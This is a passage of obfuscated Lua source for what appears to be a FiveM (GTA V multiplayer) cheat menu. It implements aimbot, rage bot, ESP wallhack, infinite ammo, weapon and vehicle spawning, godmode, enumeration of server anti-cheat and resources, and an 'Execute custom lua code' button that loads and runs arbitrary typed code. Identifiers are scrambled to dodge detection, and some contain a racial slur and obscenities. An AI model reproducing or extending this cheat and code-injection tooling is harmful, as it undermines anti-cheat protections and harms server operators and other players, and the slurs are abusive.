		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('WeaponMenu_UDHSGOSDUFGIDSF') then
			if MenuButton_eytfudskfbukdsger("Single Wep Spawner", "WeaponMenu_SingleWepSpawner_IDSHGOIUSDFGLDSF") then
			elseif MenuButton_eytfudskfbukdsger("Weapon Customization", "Weapon_Customization_Menu_DUHGIFSUDHGUSF") then
			elseif Button_yetwyfguydfkjesrg("Give All Weapons") then
				for i_didsfyg98sduriesdfg = 1, #Wszystkie_Bronie_Umnie_duaghoidfgdf do
					Czitirzen_Invoke(0xBF0FD6E56C964FCB, Czitirzen_Invoke(0xD80958FC74E988A6), Czitirzen_Invoke(0xD24D37CC275948CC, "WEAPON_"..Wszystkie_Bronie_Umnie_duaghoidfgdf[i_didsfyg98sduriesdfg]), 1000, false, false)
				end
			elseif Button_yetwyfguydfkjesrg("Remove All Weapons") then
				for i_didsfyg98sduriesdfg = 1, #Wszystkie_Bronie_Umnie_duaghoidfgdf do
					Czitirzen_Invoke(0x4899CB088EDF59B8, Czitirzen_Invoke(0xD80958FC74E988A6), Czitirzen_Invoke(0xD24D37CC275948CC, "WEAPON_"..Wszystkie_Bronie_Umnie_duaghoidfgdf[i_didsfyg98sduriesdfg]))
				end
			elseif Button_yetwyfguydfkjesrg("Give Custom Weapon") then
			local weapon_disygo9dfuigdsf = KeyBoardInput_jdhgijslrgeg("Type name of weapon e.g WEAPON_PISTOL", "WEAPON_", 100)
			if weapon_disygo9dfuigdsf ~= nil then
			Czitirzen_Invoke(0xBF0FD6E56C964FCB, Czitirzen_Invoke(0xD80958FC74E988A6), Czitirzen_Invoke(0xD24D37CC275948CC, string.upper(weapon_disygo9dfuigdsf)), 1000, false, false)
			end
			elseif Button_yetwyfguydfkjesrg("Remove Custom Weapon") then
				local weapon_disygo9dfuigdsf = KeyBoardInput_jdhgijslrgeg("Type name of weapon, e.g. WEAPON_PISTOL", "WEAPON_", 100)
				if weapon_disygo9dfuigdsf ~= nil then
				Czitirzen_Invoke(0x4899CB088EDF59B8, Czitirzen_Invoke(0xD80958FC74E988A6), Czitirzen_Invoke(0xD24D37CC275948CC, string.upper(weapon_disygo9dfuigdsf)))
				end
			elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Infinite Ammo",
				nieskonczone_ammo_rozumieszXD_diufyasdigdsdfgdf,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					nieskonczone_ammo_rozumieszXD_diufyasdigdsdfgdf = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
			elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"OneShot",
				oneshot_USHGUYHKGFDGDF,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					oneshot_USHGUYHKGFDGDF = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
			elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Rage Bot",
				rage_bot_toogle_ifdsygdiufgsdfg,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					rage_bot_toogle_ifdsygdiufgsdfg = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
			elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Anti-AIM",
				antiaim_SDGISDIGSDGSD,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					antiaim_SDGISDIGSDGSD = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
			elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Draw aimbot fov",
				draw_aimbot_fov_DHGSIUGDSGDF,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					draw_aimbot_fov_DHGSIUGDSGDF = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
			elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"Legit Aim-bot (RMOUSE)",
				legit_aimbot_toogle_duygsudhkgsdfgsdfg,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					legit_aimbot_toogle_duygsudhkgsdfgsdfg = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
		    elseif Slider_dghiuergsergerg("AimBot Fov", {"Full Legit", "Normal", "Semi-Rage"}, current_fov_SUHFIUSDFSDF, function(UYDIIDFYGDIUFHIGDFG)
            current_fov_SUHFIUSDFSDF = UYDIIDFYGDIUFHIGDFG
			if current_fov_SUHFIUSDFSDF == 1 then
			fov_x_DISFISDUSGFDG = 0.45
			fov_x2_DISFISDUSGFDG = 0.55
			fov_y_DISFISDUSGFDG = 0.45
			fov_y2_DISFISDUSGFDG = 0.55
			elseif current_fov_SUHFIUSDFSDF == 2 then
			fov_x_DISFISDUSGFDG = 0.40
			fov_x2_DISFISDUSGFDG = 0.60
			fov_y_DISFISDUSGFDG = 0.40
			fov_y2_DISFISDUSGFDG = 0.60
			elseif current_fov_SUHFIUSDFSDF == 3 then
			fov_x_DISFISDUSGFDG = 0.30
			fov_x2_DISFISDUSGFDG = 0.70
			fov_y_DISFISDUSGFDG = 0.30
			fov_y2_DISFISDUSGFDG = 0.70
			end
		    end) then
			end

		    Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('WeaponMenu_SingleWepSpawner_IDSHGOIUSDFGLDSF') then
			for i_didsfyg98sduriesdfg = 1, #Wszystkie_Bronie_Umnie_duaghoidfgdf do
				if Button_yetwyfguydfkjesrg("~g~SPAWN ~r~ > ~p~ ".. Wszystkie_Bronie_Umnie_duaghoidfgdf[i_didsfyg98sduriesdfg]) then
					Czitirzen_Invoke(0xBF0FD6E56C964FCB, Czitirzen_Invoke(0xD80958FC74E988A6), Czitirzen_Invoke(0xD24D37CC275948CC, "WEAPON_"..Wszystkie_Bronie_Umnie_duaghoidfgdf[i_didsfyg98sduriesdfg]), 1000, false, false)
				end
			end

			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Weapon_Customization_Menu_DUHGIFSUDHGUSF') then
			if Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~g~Add ~s~Special Finish") then
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x27872C90)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xD7391086)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x9B76C72C)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x487AAE09)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x85A64DF9)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x377CD377)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xD89B9658)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x4EAD7533)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x4032B5E7)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x77B8AB2F)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x7A6A7B7B)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x161E9241)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Special Finish") then
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x27872C90)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD7391086)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x9B76C72C)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x487AAE09)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x85A64DF9)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x377CD377)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD89B9658)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x4EAD7533)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x4032B5E7)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x77B8AB2F)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x7A6A7B7B)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x161E9241)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~g~Add ~s~Extended Clip") then
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x249A17D5)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x64F9C62B)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x7B0033B3)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x7C8BD10E)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x86BD7F72)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x8EC1C979)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xB3688B0F)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xD6C59CD6)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xED265A1C)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xD67B4F2D)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xD9D3AC92)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x33BA12E8)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x10E6BA2B)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x350966FB)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xBB46E417)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x334A5203)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x82158B47)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xEAC8C270)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xB1214F9B)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x91109691)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xCCFD2AC5)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x971CF6FD)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Extended Clip") then
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x249A17D5)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x64F9C62B)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x7B0033B3)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x7C8BD10E)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x86BD7F72)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x8EC1C979)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xB3688B0F)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD6C59CD6)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xED265A1C)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD67B4F2D)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD9D3AC92)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x33BA12E8)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x10E6BA2B)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x350966FB)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xBB46E417)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x334A5203)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x82158B47)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xEAC8C270)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xB1214F9B)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x91109691)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xCCFD2AC5)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x971CF6FD)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~g~Add ~s~Flashlight") then
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x359B7AAE)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x7BC4CDDC)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Flashlight") then
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x359B7AAE)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x7BC4CDDC)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~g~Add ~s~Grip") then
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xC164F53)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Grip") then
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xC164F53)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~g~Add ~s~Suppresor") then
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x65EA7EBB)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x837445AA)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xA73D4664)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xC304849A)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xE608B35E)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Suppresor") then
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x65EA7EBB)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x837445AA)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xA73D4664)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xC304849A)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xE608B35E)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~g~Add ~s~Scope") then
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x9D2FBF29)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xA0D89C42)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xAA2C45B4)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0xD2443DDC)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x3CC6BA57)
				AddCustomization_HugeV_DSIUHGIUDSGSD(0x3C00AFED)
			elseif Button_yetwyfguydfkjesrg("~p~Customization ~r~ > ~s~ ~r~Remove ~s~Scope") then
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x9D2FBF29)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xA0D89C42)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xAA2C45B4)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0xD2443DDC)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x3CC6BA57)
				RemoveCustomization_HugeV_DSIUHGIUDSGSD(0x3C00AFED)
			end

		    Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('VisualMenu_duagyo8e7rgsdfg') then
		if MenuButton_eytfudskfbukdsger("Weather", 'Weather_IODSSDFGIDS') then
		elseif MenuButton_eytfudskfbukdsger("ESP Menu", 'ESP_MENU_DUHFIDSUGHUIDFG') then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"~g~Player Blips",
			playerBlips_ADSIUSDIGHISUDGGIDSGSD,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				playerBlips_ADSIUSDIGHISUDGGIDSGSD = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"~g~Force Radar",
			display_radar_DSGHSDUGSDG,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				display_radar_DSGHSDUGSDG = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
            "~p~BEST ~r~ > ~s~ Crosshair",
            celownik_1_duifhosidugldsf,
            function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				celownik_1_duifhosidugldsf = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
                end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
				"~g~DOT ~r~ > ~s~ Crosshair",
				celownik_2_idsoaygh8reigdsfg,
				function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
					celownik_2_idsoaygh8reigdsfg = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
					end)
				then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
            "~g~LEGIT ~r~ > ~s~ Force third person",
            force_3_osoba_xd_dihgsdiugsdf,
            function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				force_3_osoba_xd_dihgsdiugsdf = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
                end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
            "~g~LEGIT ~r~ > ~s~ Force DriveBy",
            force_drive_by_xd_dihgsdiugsdf,
            function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				force_drive_by_xd_dihgsdiugsdf = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
                end)
			then
			end
			
			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('ESP_MENU_DUHFIDSUGHUIDFG') then
		if CheckBox_twrtdysfgjsekglkmrseijg(
            "~p~ESP ~r~ > ~s~ ESP ~g~Turn ON",
            esp_duhsgiudfgdfg,
            function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				esp_duhsgiudfgdfg = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
                end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
            "~p~ESP ~r~ > ~s~ ESP Info",
            espinfo_ihfdsoudgifgdfg,
            function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				espinfo_ihfdsoudgifgdfg = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
                end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
            "~p~ESP ~r~ > ~s~ ESP Lines",
            esplines_IDSUHGIUFDHGUDFHIG,
            function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				esplines_IDSUHGIUFDHGUDFHIG = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
                end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
            "~p~ESP ~r~ > ~s~ ESP Box",
            espbox_dsuhfisdugsdfg,
            function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				espbox_dsuhfisdugsdfg = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
                end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
            "~p~ESP ~r~ > ~s~ Name above head",
            nameabove_duhsgsiudgsdgrdf,
            function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				nameabove_duhsgsiudgsdgrdf = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
                end)
			then
		end

			Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Weather_IODSSDFGIDS') then
			if Button_yetwyfguydfkjesrg("~b~LOCAL ~r~ > ~s~ XMAS") then
				Czitirzen_Invoke(0x704983DF373B198F, "XMAS") -- Ustawianie pogody
				Czitirzen_Invoke(0xED712CA327900C8A, "XMAS") -- Ustawianie pogody
				Czitirzen_Invoke(0x29B487C359E19889, "XMAS") -- Ustawianie pogody
				Czitirzen_Invoke(0xA43D5C6FE51ADBEF, "XMAS") -- Ustawianie pogody
			elseif Button_yetwyfguydfkjesrg("~b~LOCAL ~r~ > ~s~ EXTRASUNNY") then
				Czitirzen_Invoke(0x704983DF373B198F, "EXTRASUNNY") -- Ustawianie pogody
				Czitirzen_Invoke(0xED712CA327900C8A, "EXTRASUNNY") -- Ustawianie pogody
				Czitirzen_Invoke(0x29B487C359E19889, "EXTRASUNNY") -- Ustawianie pogody
				Czitirzen_Invoke(0xA43D5C6FE51ADBEF, "EXTRASUNNY") -- Ustawianie pogody
			elseif Button_yetwyfguydfkjesrg("~b~LOCAL ~r~ > ~s~ Set time to day") then
				Czitirzen_Invoke(0xE679E3E06E363892, 12, 0, 0) -- Ustawianie czasu, kurwa nie wiedzailem wiesz?
			end
			
		    Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('ServerOptions_dugdas8u8gy3wo4hgdf') then
		if MenuButton_eytfudskfbukdsger("Anty-Cheats", 'AntyCheats_OSDAIYG3487GHDFG') then
		elseif MenuButton_eytfudskfbukdsger("Scripts", 'skrypt_nigger_DSUIGHSIDUGHIUDSy_UDSGIS8GE7IOW4U3DSF') then
		elseif Button_yetwyfguydfkjesrg("~p~50/50 ~r~ > ~s~ Execute custom lua code") then
		local code_to_execute_diushdgiosg = KeyBoardInput_jdhgijslrgeg("Type code to execute", "", 99999999)
		local code_to_pcall_dihsgiuhfgisldugdf = load(code_to_execute_diushdgiosg)
		pcall(code_to_pcall_dihsgiuhfgisldugdf)
		end
		
		    Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('skrypt_nigger_DSUIGHSIDUGHIUDSy_UDSGIS8GE7IOW4U3DSF') then
		for i_dihgiseuorg43dfg=1, GetNumResources_HugeV_DUSGUFFHIDGIDFG() do
		local skrypt_nigger_DSUIGHSIDUGHIUDS = GetResourceByFindIndex_HugeV_DSUGHIUDSHIUFDGDF(i_dihgiseuorg43dfg)
		if skrypt_nigger_DSUIGHSIDUGHIUDS==nil then
		elseif skrypt_nigger_DSUIGHSIDUGHIUDS=="_cfx_internal"then
		else
		if Button_yetwyfguydfkjesrg(skrypt_nigger_DSUIGHSIDUGHIUDS) then 
		PushNotification_DSGJHDSGHSIDUGDS("~g~".. skrypt_nigger_DSUIGHSIDUGHIUDS)
		end
		end
		end
			
		    Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('AntyCheats_OSDAIYG3487GHDFG') then
		if #AntyCheats_duhgw894ghwo34gdfsg == 0 then
		if Button_yetwyfguydfkjesrg("Not found") then end
		else
		for i_dihgiseuorg43dfg=1, #AntyCheats_duhgw894ghwo34gdfsg do
            if Button_yetwyfguydfkjesrg(AntyCheats_duhgw894ghwo34gdfsg[i_dihgiseuorg43dfg]) then
			   end
            end
	    end
			
		    Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('VehicleMenu_UDG8SIDU') then
		if MenuButton_eytfudskfbukdsger("Spawn Options", "Spawn_Vehicle_Options_UDHUGFIDFHOGDF") then
		elseif Button_yetwyfguydfkjesrg("Spawn custom car") then
		local ModelName_fuhgs8ordhfdsfg = KeyBoardInput_jdhgijslrgeg("Type a name of vehicle", "", 100)
		local autko_dihgs8oregsfdg = Czitirzen_Invoke(0xD24D37CC275948CC, ModelName_fuhgs8ordhfdsfg)
        if ModelName_fuhgs8ordhfdsfg and Czitirzen_Invoke(0xC0296A2EDF545E92, autko_dihgs8oregsfdg) and Czitirzen_Invoke(0x19AAC8F07BFEC53E, autko_dihgs8oregsfdg) then
		RequestModelSync_SDUFHSIDGSDG(autko_dihgs8oregsfdg)
		
		if Delete_Current_Vehicle_DSIGHDSIUGSDG then
		local veh_DSGUHSDIUGSDUGSDGSDG = GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0xD80958FC74E988A6), 0)
		Czitirzen_Invoke(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(veh_DSGUHSDIUGSDUGSDGSDG))
		end

        local veh_duhgs8uoiregfdg = Czitirzen_Invoke(0xAF35D0D2583051B0, Czitirzen_Invoke(0xD24D37CC275948CC, ModelName_fuhgs8ordhfdsfg), GetEntityCoords_HugeV_UDHGIUDIKGDFG(Czitirzen_Invoke(0xD80958FC74E988A6)), Czitirzen_Invoke(0xE83D4F9BA2A38914, Czitirzen_Invoke(0xD80958FC74E988A6)), true, true)
		if Spawn_In_Veh_UHUDGFDGDF then
        Czitirzen_Invoke(0xF75B0D629E1C063D, Czitirzen_Invoke(0xD80958FC74E988A6), veh_duhgs8uoiregfdg, -1)
		end
            else
        PushNotification_DSGJHDSGHSIDUGDS("Model Not Found!")
			end
			elseif Button_yetwyfguydfkjesrg("Spawn Flying Plane!") then
            OMGGGGG_SOO_SEXY_BROOM_LICK_MY_SPERM()
		elseif Slider_dghiuergsergerg("Vehicle Actions", {"Repair", "Repair Engine", "Flip", "Delete"}, cur_action_duhgsidugsdfg, function(UYDIIDFYGDIUFHIGDFG)
            cur_action_duhgsidugsdfg = UYDIIDFYGDIUFHIGDFG
		end) then
		if cur_action_duhgsidugsdfg == 1 then
		Czitirzen_Invoke(0x115722B1B9C14C1C, Czitirzen_Invoke(0x9A9112A0FE9A4713, Czitirzen_Invoke(0x43A66C31C68491C0, -1), false))
        Czitirzen_Invoke(0x79D3B596FE44EE8B, Czitirzen_Invoke(0x9A9112A0FE9A4713, Czitirzen_Invoke(0x43A66C31C68491C0, -1), false), 0.0)
        Czitirzen_Invoke(0x34E710FF01247C5A, Czitirzen_Invoke(0x9A9112A0FE9A4713, Czitirzen_Invoke(0x43A66C31C68491C0, -1), false), 0)
        Czitirzen_Invoke(0xFB8794444A7D60FB, Czitirzen_Invoke(0x9A9112A0FE9A4713, Czitirzen_Invoke(0x43A66C31C68491C0, -1), false), false)
        Czitirzen_Invoke(0x1FD09E7390A74D54, Czitirzen_Invoke(0x9A9112A0FE9A4713, Czitirzen_Invoke(0x43A66C31C68491C0, -1), false), 0)
		elseif cur_action_duhgsidugsdfg == 2 then
		Czitirzen_Invoke(0x45F6D8EEF34ABEF1, GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, -1)), 10000)
        Czitirzen_Invoke(0x1FD09E7390A74D54, GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, -1), false), 0)
        Czitirzen_Invoke(0x8ABA6AF54B942B95, GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, -1)), false)
		Czitirzen_Invoke(0xFB8794444A7D60FB, GetVehiclePedIsIn_HugeV_IDHUFYUHSUDGFD(Czitirzen_Invoke(0x43A66C31C68491C0, -1)), false)
		elseif cur_action_duhgsidugsdfg == 3 then
		local vehicle_dugshisdfg = Czitirzen_Invoke(0x6094AD011A2EA87D, Czitirzen_Invoke(0xD80958FC74E988A6))
		Czitirzen_Invoke(0x49733E92263139D1, vehicle_dugshisdfg)
		elseif cur_action_duhgsidugsdfg == 4 then
		local vehicle_dugshisdfg = Czitirzen_Invoke(0x6094AD011A2EA87D, Czitirzen_Invoke(0xD80958FC74E988A6))
		Czitirzen_Invoke(0xAD738C3085FE7E11, vehicle_dugshisdfg, true, true)
		Czitirzen_Invoke(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(vehicle_dugshisdfg))
		end
		elseif Button_yetwyfguydfkjesrg("Max Tuning") then
		local vehicle_dugshisdfg = Czitirzen_Invoke(0x6094AD011A2EA87D, Czitirzen_Invoke(0xD80958FC74E988A6))
		full_tuning_dugisdgdsfgidf(vehicle_dugshisdfg)
		elseif Button_yetwyfguydfkjesrg("Max Mechanics") then
		local vehicle_dugshisdfg = Czitirzen_Invoke(0x6094AD011A2EA87D, Czitirzen_Invoke(0xD80958FC74E988A6))
		full_tuning_pref_dugisdgdsfgidf(vehicle_dugshisdfg)
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"~r~R~g~a~b~i~p~n~y~b~o~o~r~w ~s~Vehicle",
			RainbowVehicle_DSGUHSDGDS,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				RainbowVehicle_DSGUHSDGDS = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"Vehicle Godmode",
			Vehicle_GodMode_DSIGHSDIUGIDS,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				Vehicle_GodMode_DSIGHSDIUGIDS = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"Speed Boost",
			SpeedBoost_DSUGHSDUIGDS,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				SpeedBoost_DSUGHSDUIGDS = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
			elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"Magic Carpet",
			MagicCarpet_DSUGSIGSDGSD,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				MagicCarpet_DSUGSIGSDGSD = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
	end
		
		    Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('Spawn_Vehicle_Options_UDHUGFIDFHOGDF') then
		if CheckBox_twrtdysfgjsekglkmrseijg(
			"Spawn in vehicle",
			Spawn_In_Veh_UHUDGFDGDF,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				Spawn_In_Veh_UHUDGFDGDF = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
		elseif CheckBox_twrtdysfgjsekglkmrseijg(
			"Delete current vehicle",
			Delete_Current_Vehicle_DSIGHDSIUGSDG,
			function(Wlaczone_Menu_XD_dugao8iugsgsergsdfg)
				Delete_Current_Vehicle_DSIGHDSIUGSDG = Wlaczone_Menu_XD_dugao8iugsgsergsdfg
				end)
			then
			end
			
		    Display_uyeigsgegkersugesrg()
		elseif IsMenuOpened_dghiusergisehrubgiusdfesg('SelfMenu_IHJIDLSGEG') then
		if MenuButton_eytfudskfbukdsger('Super Powers', 'Super_Powers_Skurwysynku') then
		elseif MenuButton_eytfudskfbukdsger('Outfit Menu', 'Outfit_SDUGHSIDUGSDG') then
		elseif MenuButton_eytfudskfbukdsger('Peds Menu', 'Peds_DSGHSDIUG') then
